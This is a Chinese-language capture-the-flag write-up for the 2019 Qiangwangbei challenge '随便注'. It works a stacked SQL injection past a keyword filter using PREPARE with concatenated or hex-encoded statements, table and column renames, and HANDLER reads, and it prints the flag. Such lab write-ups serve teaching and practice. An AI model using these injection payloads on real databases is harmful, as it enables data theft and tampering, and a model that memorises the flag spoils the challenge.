@@ -1,0 +1,88 @@
+<h1 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h1><blockquote>
+<p>先判断注入点的传参方式，发现是get传参。</p>
+</blockquote>
+<blockquote>
+<p>判断闭合方式：输入1再输入1’试试	，发现是字符型且闭合方式是单引号</p>
+</blockquote>
+<blockquote>
+<p>判断一下字符个数<code>&#39; union select 1,2;#</code>​，系统提示<code>return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);</code>​</p>
+</blockquote>
+<blockquote>
+<p>&#x3D;&#x3D;select&#x3D;&#x3D;关键字无法使用，我们可以通过&#x3D;&#x3D;堆叠注入&#x3D;&#x3D;的方式，来绕过select关键字。</p>
+</blockquote>
+<blockquote>
+<p>&#x3D;&#x3D;查看数据库名：&#x3D;&#x3D;​<code>1&#39;;show databases;#</code>​</p>
+</blockquote>
+<p><img src="/assets/image-20250418170120-z5w8c3n.png" alt="image">​</p>
+<blockquote>
+<p>&#x3D;&#x3D;查看数据表：&#x3D;&#x3D;​<code>1&#39;;show tables;#</code>​</p>
+</blockquote>
+<p><img src="/assets/image-20250418170223-5ylj1zk.png" alt="image"></p>
+<blockquote>
+<p>查看表结构：</p>
+<p>方式一：<code>1&#39;; show columns from tableName;#</code>​</p>
+<p>方式二：<code>1&#39;;desc tableName;#</code>​</p>
+<p>注意，如果tableName是纯数字，需要用反引号包裹</p>
+</blockquote>
+<p><img src="/assets/image-20250418170425-ugseo8r.png" alt="image"></p>
+<blockquote>
+<p>因为select关键字被过滤了，所以我们可以通过&#x3D;&#x3D;预编译&#x3D;&#x3D;的方式&#x3D;&#x3D;拼接&#x3D;&#x3D;select 关键字：<code>1&#39;;PREPARE hacker from concat(&#39;s&#39;,&#39;elect&#39;, &#39; * from `1919810931114514` &#39;);EXECUTE  hacker;#</code>​得flag：flag{c0fc32ff-8ae1-4b96-8da0-1f621d7fdae3}  （关于预编译的讲解请见下文）</p>
+</blockquote>
+<p>‍</p>
+<p>‍</p>
+<h2 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h2><blockquote>
+<p>前几步和方法一一致，最后一步（第8步），我们可以直接将<code>select * from `1919810931114514` </code>​语句进行16进制编码，即：<code>73656c656374202a2066726f6d20603139313938313039333131313435313460</code>​，替换payload：</p>
+<p>​<code>1&#39;;PREPARE hacker from 0x73656c656374202a2066726f6d20603139313938313039333131313435313460;EXECUTE  hacker;#</code>​</p>
+<p>同时，我们也可以先定义一个变量并将sql语句初始化，然后调用</p>
+<p>​<code>1&#39;;Set @jia = 0x73656c656374202a2066726f6d20603139313938313039333131313435313460;PREPARE hacker from @jia;EXECUTE hacker;#</code>​</p>
+</blockquote>
+<p>‍</p>
+<h2 id="方法三"><a href="#方法三" class="headerlink" title="方法三"></a>方法三</h2><blockquote>
+<p>最后一步（第8步）也可以通过修改表名和列名来实现。我们输入1后，默认会显示id为1的数据，可以猜测默认显示的是words表的数据，查看words表结构第一个字段名为<code>id</code>​我们把words表随便改成words1，然后把1919810931114514表改成words，再把列名flag改成id，就可以达到直接输出flag字段的值的效果：<code>1&#39;;  alter table words rename to words1;alter table `1919810931114514`  rename to words;alter table words change flag id varchar(50);# </code>​，然后通过<code>1&#39; or 1 = 1 #</code>​，成功获取到flag。 （关于更改表名的讲解请见下文）</p>
+</blockquote>
+<p>‍</p>
+<h2 id="方法四"><a href="#方法四" class="headerlink" title="方法四"></a>方法四</h2><blockquote>
+<p>此题还可以通过&#x3D;&#x3D;handle&#x3D;&#x3D;直接出答案：<code>1&#39;;HANDLER `1919810931114514` OPEN;HANDLER `1919810931114514` READ FIRST;HANDLER `1919810931114514` CLOSE;</code>​</p>
+</blockquote>
+<p>‍</p>
+<p>‍</p>
+<h1 id="知识详解"><a href="#知识详解" class="headerlink" title="知识详解"></a>知识详解</h1><h2 id="1-预编译"><a href="#1-预编译" class="headerlink" title="1.预编译"></a>1.预编译</h2><p>预编译相当于定一个语句相同，参数不通的&#x3D;&#x3D;mysql&#x3D;&#x3D;模板，我们可以通过预编译的方式，绕过特定的字符过滤</p>
+<p>格式：</p>
+<pre><code class="language-text">PREPARE 名称 FROM 	Sql语句 ? ;
+SET @x=xx;
+EXECUTE 名称 USING @x;
+</code></pre>
+<p>举例：查询ID为1的用户：</p>
+<pre><code class="language-text">方法一：
+SElECT * FROM t_user WHERE USER_ID = 1
+
+方法二：
+PREPARE jia FROM &#39;SElECT * FROM t_user WHERE USER_ID = 1&#39;;
+EXECUTE jia;
+
+方法三：
+PREPARE jia FROM &#39;SELECT * FROM t_user WHERE USER_ID = ?&#39;;
+SET @ID = 1;
+EXECUTE jia USING @ID;
+
+方法四：
+SET @SQL=&#39;SElECT * FROM t_user WHERE USER_ID = 1&#39;;
+PREPARE jia FROM @SQL;
+EXECUTE jia;
+</code></pre>
+<h2 id="2-更改表名"><a href="#2-更改表名" class="headerlink" title="2. 更改表名"></a>2. 更改表名</h2><ul>
+<li>修改表名：<code>ALTER TABLE 旧表名 RENAME TO 新表名；</code>​</li>
+<li>修改字段：<code>ALTER TABLE 表名 CHANGE 旧字段名 新字段名 新数据类型；</code>​</li>
+</ul>
+<h2 id="3-handle"><a href="#3-handle" class="headerlink" title="3.handle"></a>3.handle</h2><ul>
+<li>handle不是通用的SQL语句，是Mysql特有的，可以逐行浏览某个表中的数据，格式：</li>
+</ul>
+<pre><code class="language-text">打开表：
+HANDLER 表名 OPEN ;
+
+查看数据：
+HANDLER 表名 READ next;
+
+关闭表：
+HANDLER 表名 READ CLOSE;
+</code></pre>
